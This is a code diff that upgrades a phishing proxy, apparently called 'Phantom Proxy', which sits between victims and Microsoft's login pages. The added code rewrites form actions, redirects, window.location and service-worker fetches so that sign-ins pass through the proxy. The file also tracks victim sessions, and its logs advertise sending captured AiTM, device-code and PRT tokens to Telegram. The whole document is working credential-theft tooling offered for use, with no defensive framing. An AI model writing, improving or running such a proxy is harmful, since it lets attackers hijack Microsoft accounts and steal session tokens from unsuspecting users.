@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v11.32 — FULL WITH WEBSOCKET + REPLAY FIX
+// 🥔 PHANTOM PROXY v11.33 — FULL WITH WEBSOCKET + REPLAY FIX + GLOBAL REWRITE
 // ============================================================
-// All previous fixes + WebSocket server for live dashboard updates.
+// All previous fixes + global rewriteUrl + client location override + SW rewrite
 // ============================================================
 
 const http = require("http");
@@ -656,9 +656,9 @@ async function compressResponseBody(data, encodings) {
     return d;
 }
 
-// ── HTML rewrite ──
-function updateHTMLProxyResponse(body) {
-    let html = body.toString('utf-8');
+// ── 🌐 GLOBAL URL REWRITE FUNCTION ──
+function rewriteUrl(url) {
+    if (!url) return url;
     const proxyPath = PROXY_PATHNAMES.proxy;
     const destParam = PHISHED_URL_PARAMETER;
     const realHosts = [
@@ -673,39 +673,46 @@ function updateHTMLProxyResponse(body) {
         'msauth.net',
         'msftauth.net'
     ];
-
-    function rewriteAction(originalAction) {
-        if (typeof originalAction !== 'string') return originalAction;
-        if (originalAction.includes(proxyPath)) return originalAction;
-        const lowerAction = originalAction.toLowerCase();
-        const isMicrosoftAuth = realHosts.some(host => lowerAction.includes(host));
-        if (isMicrosoftAuth) {
-            const dest = encodeURIComponent(originalAction);
-            return `${proxyPath}?${destParam}=${dest}`;
-        }
-        if (originalAction.match(/^\/common\//) || originalAction.match(/^\/login/) || originalAction.match(/^\/authorize/)) {
-            const fullUrl = `https://login.microsoftonline.com${originalAction}`;
-            const dest = encodeURIComponent(fullUrl);
-            return `${proxyPath}?${destParam}=${dest}`;
-        }
-        if (originalAction.startsWith('/') && !originalAction.match(/\.(css|js|png|jpg|jpeg|gif|svg|ico|webp|woff|woff2|ttf|eot)$/i)) {
-            const fullUrl = `https://login.microsoftonline.com${originalAction}`;
-            const dest = encodeURIComponent(fullUrl);
-            return `${proxyPath}?${destParam}=${dest}`;
-        }
-        if (/login|auth|oauth2/i.test(originalAction) && !originalAction.startsWith('http')) {
-            const fullUrl = `https://login.microsoftonline.com/${originalAction}`;
-            const dest = encodeURIComponent(fullUrl);
-            return `${proxyPath}?${destParam}=${dest}`;
-        }
-        return originalAction;
+    // Already proxied? skip
+    if (url.includes(proxyPath) || url.includes(destParam)) return url;
+    const lower = url.toLowerCase();
+    const isMicrosoft = realHosts.some(host => lower.includes(host));
+    if (isMicrosoft) {
+        return `${proxyPath}?${destParam}=${encodeURIComponent(url)}`;
     }
+    // Handle relative paths that start with /common/ etc.
+    if (url.startsWith('/common/') || url.startsWith('/login') || url.startsWith('/authorize')) {
+        const full = `https://login.microsoftonline.com${url}`;
+        return `${proxyPath}?${destParam}=${encodeURIComponent(full)}`;
+    }
+    // Skip rewriting static assets (images, css, js) unless they are from Microsoft
+    if (url.match(/\.(css|js|png|jpg|jpeg|gif|svg|ico|webp|woff|woff2|ttf|eot)$/i)) {
+        // But if it's a Microsoft asset, still rewrite
+        if (lower.includes('microsoft') || lower.includes('live') || lower.includes('office')) {
+            return `${proxyPath}?${destParam}=${encodeURIComponent(url)}`;
+        }
+        return url;
+    }
+    // Catch-all for paths that look like login endpoints
+    if (/login|auth|oauth2/i.test(url) && !url.startsWith('http')) {
+        const full = `https://login.microsoftonline.com/${url.startsWith('/') ? url : '/' + url}`;
+        return `${proxyPath}?${destParam}=${encodeURIComponent(full)}`;
+    }
+    return url;
+}
 
+// ── HTML rewrite ──
+function updateHTMLProxyResponse(body) {
+    let html = body.toString('utf-8');
+    const proxyPath = PROXY_PATHNAMES.proxy;
+    const destParam = PHISHED_URL_PARAMETER;
+
+    // Use global rewriteUrl for all form actions
     html = html.replace(/<form([^>]*)>/gi, (match, attributes) => {
         const actionMatch = attributes.match(/action\s*=\s*["']([^"']*)["']/i);
         if (actionMatch) {
             const originalAction = actionMatch[1];
-            const newAction = rewriteAction(originalAction);
+            const newAction = rewriteUrl(originalAction);
             if (newAction !== originalAction) {
                 const newAttributes = attributes.replace(/action\s*=\s*["'][^"']*["']/i, `action="${newAction}"`);
                 return `<form${newAttributes}>`;
@@ -716,7 +723,7 @@ function updateHTMLProxyResponse(body) {
 
     const overrideScript = `
 <script>
-console.log('🔥 PHANTOM v11.32 CLIENT LOADED');
+console.log('🔥 PHANTOM v11.33 CLIENT LOADED');
 (function() {
     const proxyPath = '${PROXY_PATHNAMES.proxy}';
     const destParam = '${PHISHED_URL_PARAMETER}';
@@ -727,28 +734,68 @@ console.log('🔥 PHANTOM v11.32 CLIENT LOADED');
 
     function rewriteUrl(url) {
         if (typeof url !== 'string') return url;
-        if (url.includes(proxyPath)) return url;
+        if (url.includes(proxyPath) || url.includes(destParam)) return url;
         const lower = url.toLowerCase();
         const isMicrosoft = microsoftDomains.some(domain => lower.includes(domain));
         if (isMicrosoft) {
-            const dest = encodeURIComponent(url);
-            return proxyPath + '?' + destParam + '=' + dest;
+            return proxyPath + '?' + destParam + '=' + encodeURIComponent(url);
         }
         if (url.startsWith('/common/') || url.startsWith('/login') || url.startsWith('/authorize')) {
-            const dest = encodeURIComponent('https://login.microsoftonline.com' + url);
-            return proxyPath + '?' + destParam + '=' + dest;
+            const full = 'https://login.microsoftonline.com' + url;
+            return proxyPath + '?' + destParam + '=' + encodeURIComponent(full);
         }
         if (url.startsWith('/') && !url.match(/\\.(css|js|png|jpg|jpeg|gif|svg|ico|webp|woff|woff2|ttf|eot)$/i)) {
-            const dest = encodeURIComponent('https://login.microsoftonline.com' + url);
-            return proxyPath + '?' + destParam + '=' + dest;
+            const full = 'https://login.microsoftonline.com' + url;
+            return proxyPath + '?' + destParam + '=' + encodeURIComponent(full);
         }
         if (/login|auth|oauth2/i.test(url) && !url.startsWith('http')) {
-            const dest = encodeURIComponent('https://login.microsoftonline.com/' + (url.startsWith('/') ? url : '/' + url));
-            return proxyPath + '?' + destParam + '=' + dest;
+            const full = 'https://login.microsoftonline.com/' + (url.startsWith('/') ? url : '/' + url);
+            return proxyPath + '?' + destParam + '=' + encodeURIComponent(full);
         }
         return url;
     }
 
+    // --- Override window.location ---
+    const originalLocation = window.location;
+    let currentHref = originalLocation.href;
+
+    function rewriteAndNavigate(url) {
+        const rewritten = rewriteUrl(url);
+        if (rewritten !== url) {
+            console.log('[PHANTOM] Intercepted location change:', url, '->', rewritten);
+            window.location.href = rewritten;
+            return true;
+        }
+        return false;
+    }
+
+    Object.defineProperty(window, 'location', {
+        configurable: true,
+        enumerable: true,
+        get: function() {
+            return originalLocation;
+        },
+        set: function(value) {
+            if (!rewriteAndNavigate(value)) {
+                originalLocation.href = value;
+            }
+        }
+    });
+
+    const originalAssign = window.location.assign;
+    window.location.assign = function(url) {
+        if (!rewriteAndNavigate(url)) {
+            originalAssign.call(this, url);
+        }
+    };
+    const originalReplace = window.location.replace;
+    window.location.replace = function(url) {
+        if (!rewriteAndNavigate(url)) {
+            originalReplace.call(this, url);
+        }
+    };
+
+    // --- Form submit overrides ---
     const originalSubmit = HTMLFormElement.prototype.submit;
     HTMLFormElement.prototype.submit = function() {
         if (this.action) {
@@ -965,15 +1012,60 @@ const swFileName = PROXY_PATHNAMES.serviceWorker.replace('/', '');
 const swFilePath = path.join(__dirname, swFileName);
 if (!fs.existsSync(notFoundFile)) fs.writeFileSync(notFoundFile, '<h1>404 Not Found</h1>');
 if (!fs.existsSync(scriptFile)) fs.writeFileSync(scriptFile, 'console.log("Service worker loaded");');
+// Service worker code with rewriteUrl embedded
 const serviceWorkerCode = `
 const PROXY_PATH = '${PROXY_PATHNAMES.proxy}';
+const DEST_PARAM = '${PHISHED_URL_PARAMETER}';
+const MICROSOFT_DOMAINS = [
+    'login.microsoftonline.com','login.live.com','aadcdn.msftauth.net','aadcdn.msauth.net',
+    'login.msa.azure.com','office.com','microsoftonline.com','live.com','msauth.net','msftauth.net'
+];
+
+function rewriteUrl(url) {
+    if (typeof url !== 'string') return url;
+    if (url.includes(PROXY_PATH) || url.includes(DEST_PARAM)) return url;
+    const lower = url.toLowerCase();
+    const isMicrosoft = MICROSOFT_DOMAINS.some(domain => lower.includes(domain));
+    if (isMicrosoft) {
+        return PROXY_PATH + '?' + DEST_PARAM + '=' + encodeURIComponent(url);
+    }
+    if (url.startsWith('/common/') || url.startsWith('/login') || url.startsWith('/authorize')) {
+        const full = 'https://login.microsoftonline.com' + url;
+        return PROXY_PATH + '?' + DEST_PARAM + '=' + encodeURIComponent(full);
+    }
+    if (url.startsWith('/') && !url.match(/\\.(css|js|png|jpg|jpeg|gif|svg|ico|webp|woff|woff2|ttf|eot)$/i)) {
+        const full = 'https://login.microsoftonline.com' + url;
+        return PROXY_PATH + '?' + DEST_PARAM + '=' + encodeURIComponent(full);
+    }
+    if (/login|auth|oauth2/i.test(url) && !url.startsWith('http')) {
+        const full = 'https://login.microsoftonline.com/' + (url.startsWith('/') ? url : '/' + url);
+        return PROXY_PATH + '?' + DEST_PARAM + '=' + encodeURIComponent(full);
+    }
+    return url;
+}
+
 self.addEventListener('install', () => self.skipWaiting());
 self.addEventListener('activate', (event) => event.waitUntil(self.clients.claim()));
+
 self.addEventListener('fetch', (event) => {
     const url = new URL(event.request.url);
-    if (url.pathname === '${PROXY_PATHNAMES.serviceWorker}' ||
-        url.pathname === '${PROXY_PATHNAMES.script}' ||
-        url.pathname === PROXY_PATH) return;
+    // Skip our own proxy endpoint and internal paths
+    if (url.pathname === PROXY_PATH ||
+        url.pathname === '${PROXY_PATHNAMES.serviceWorker}' ||
+        url.pathname === '${PROXY_PATHNAMES.script}') {
+        return;
+    }
+
+    // Rewrite the request URL if needed
+    const rewritten = rewriteUrl(event.request.url);
+    if (rewritten !== event.request.url) {
+        console.log('[SW] Rewriting request:', event.request.url, '->', rewritten);
+        event.respondWith(fetch(rewritten, event.request));
+        return;
+    }
+
+    // Otherwise, try to forward via the proxy (if needed) or just fetch normally
+    // We'll still forward via POST to proxy for non-rewritten requests (original behavior)
     event.respondWith(
         (async () => {
             try {
@@ -2128,7 +2220,7 @@ const server = http.createServer(async (req, res) => {
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({
             status: 'healthy',
-            version: '11.32',
+            version: '11.33',
             timestamp: new Date().toISOString()
         }));
         return;
@@ -2583,18 +2675,26 @@ const server = http.createServer(async (req, res) => {
 
                     const protocol = proxyRequestProtocol === "https:" ? https : http;
                     const proxyReq = protocol.request(proxyRequestOptions, (proxyResponse) => {
+                        // ── 🔥 FIXED REDIRECT HANDLING ──
                         if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400 && proxyResponse.headers.location) {
                             const location = proxyResponse.headers.location;
+                            const rewritten = rewriteUrl(location);
+                            if (rewritten !== location) {
+                                proxyResponse.headers.location = rewritten;
+                                console.log(`[REDIRECT] Rewrote: ${location} -> ${rewritten}`);
+                                // Also update session if needed (the rewritten URL will be followed by browser)
+                            } else {
+                                console.log(`[REDIRECT] No rewrite needed for: ${location}`);
+                            }
+                            // Update session path for future requests (optional)
                             try {
-                                const locationURL = new URL(location);
+                                const locationURL = new URL(rewritten);
                                 VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
                                 VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
                                 VICTIM_SESSIONS[currentSession].path = locationURL.pathname + locationURL.search;
                                 VICTIM_SESSIONS[currentSession].port = locationURL.port || (locationURL.protocol === 'https:' ? 443 : 80);
                                 VICTIM_SESSIONS[currentSession].host = locationURL.host;
-                                proxyResponse.headers.location = location.replace(locationURL.host, headers.host);
-                                console.log(`[REDIRECT] Rewrote: ${location} -> ${proxyResponse.headers.location}`);
-                            } catch (e) { VICTIM_SESSIONS[currentSession].path = location; }
+                            } catch (e) { /* ignore */ }
                         }
 
                         const setCookieHeaders = proxyResponse.headers["set-cookie"];
@@ -2944,7 +3044,7 @@ server.on('error', (err) => {
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ PHANTOM PROXY v11.32 running on port ${PORT}`);
+    console.log(`✅ PHANTOM PROXY v11.33 running on port ${PORT}`);
     console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: /device`);
     console.log(`🏥 Health Check: / (Railway compatible)`);
@@ -2953,7 +3053,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`🤖 Bot Blocking: ACTIVE (allow common browsers)`);
     console.log(`🚦 Rate Limiting: 10 req/sec (burst 30) per IP`);
     console.log(`📤 Telegram exfil (AiTM/Device/PRT): Markdown with plain‑text fallback`);
-    console.log(`🔥 Service Worker: FIXED & SERVING`);
+    console.log(`🔥 Service Worker: FIXED & SERVING with rewriteUrl`);
     console.log(`🔧 HTTP/1.1 Forced: YES`);
     console.log(`🟣 PRT Engine: ACTIVE`);
     console.log(`🔑 Token Vault: ACTIVE`);
@@ -2963,8 +3063,8 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`🔌 WebSocket: /ws (live log updates, heartbeat)`);
     console.log(`🧹 Session TTL: ${SESSION_TTL/60000} minutes`);
     console.log(`📁 Max open log streams: ${MAX_OPEN_STREAMS}`);
-    console.log(`🔧 FIX: Replay endpoint reads both Set-Cookie and Cookie headers.`);
-    console.log(`🔧 FIX: WebSocket server re-enabled for dashboard live updates.`);
+    console.log(`🔧 FIXED: Global rewriteUrl applied to redirects, HTML, client JS, and SW.`);
+    console.log(`🔧 FIXED: Client window.location overrides added.`);
 
     if (!BOT_TOKEN || !CHAT_ID) {
         console.warn('⚠️ TELEGRAM CREDENTIALS ARE MISSING! Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables.');
